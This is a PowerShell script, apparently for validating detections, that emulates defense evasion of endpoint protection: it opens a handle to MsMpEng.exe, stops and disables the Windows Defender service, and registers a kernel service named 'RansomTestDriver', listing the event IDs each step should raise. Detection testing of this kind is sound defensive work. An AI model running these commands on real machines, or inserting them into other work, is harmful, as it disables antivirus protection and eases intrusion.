scriptContent:
# Chokepoint EDR Bypass Emulation
# Emulates service stop/disable, handle open to security process, driver install event
# Expected Detections: EID 10 (security process handle), WEL 7036/7040 (service state)

[CmdletBinding()]
param(
    [switch]$DryRun
)

Write-Host "=== Chokepoint EDR Bypass Emulation ===" -ForegroundColor Cyan
Write-Host "Emulating defense evasion techniques for detection validation"

# Stage 1: Open handle to security process (EID 10 target)
Write-Host "\n[Stage 1] Opening handle to security process..."
$securityProcess = Get-Process -Name "MsMpEng" -ErrorAction SilentlyContinue
if ($securityProcess) {
    Write-Host "  Target: MsMpEng.exe (PID: $($securityProcess.Id))" -ForegroundColor Yellow
    Write-Host "  Action: Open process handle with PROCESS_QUERY_INFORMATION" -ForegroundColor Yellow
    # This will generate EID 10 if Sysmon is monitoring process access
    $handle = [System.Diagnostics.Process]::GetProcessById($securityProcess.Id)
    Write-Host "  Result: Handle opened (detection should fire)" -ForegroundColor Green
} else {
    Write-Host "  MsMpEng.exe not found - skipping handle open" -ForegroundColor Red
}

# Stage 2: Stop Windows Defender service (WEL 7036 target)
Write-Host "\n[Stage 2] Stopping Windows Defender service..."
if (-not $DryRun) {
    try {
        Stop-Service -Name "WinDefend" -Force -ErrorAction Stop
        Write-Host "  Action: WinDefend service stopped" -ForegroundColor Yellow
        Write-Host "  Expected Detection: WEL 7036 (ServiceStateChange)" -ForegroundColor Cyan
    } catch {
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "  [DryRun] Would stop WinDefend service" -ForegroundColor Magenta
}

# Stage 3: Disable Windows Defender service (WEL 7040 target)
Write-Host "\n[Stage 3] Disabling Windows Defender service..."
if (-not $DryRun) {
    try {
        Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction Stop
        Write-Host "  Action: WinDefend service disabled" -ForegroundColor Yellow
        Write-Host "  Expected Detection: WEL 7040 (ServiceConfigChange)" -ForegroundColor Cyan
    } catch {
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "  [DryRun] Would disable WinDefend service" -ForegroundColor Magenta
}

# Stage 4: Create test kernel service (driver install emulation)
Write-Host "\n[Stage 4] Creating test kernel service..."
if (-not $DryRun) {
    try {
        sc.exe create "RansomTestDriver" type= kernel binPath= "C:\Windows\System32\drivers\null.sys"
        Write-Host "  Action: Test kernel service created" -ForegroundColor Yellow
        Write-Host "  Expected Detection: EID 7045 (ServiceInstall)" -ForegroundColor Cyan
    } catch {
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "  [DryRun] Would create test kernel service" -ForegroundColor Magenta
}

Write-Host "\n=== Emulation Complete ===" -ForegroundColor Cyan
Write-Host "Expected Detections:"
Write-Host "  - EID 10: Process access to MsMpEng.exe" -ForegroundColor Green
Write-Host "  - WEL 7036: WinDefend service state change" -ForegroundColor Green
Write-Host "  - WEL 7040: WinDefend service config change" -ForegroundColor Green
Write-Host "  - EID 7045: Kernel service installation" -ForegroundColor Green
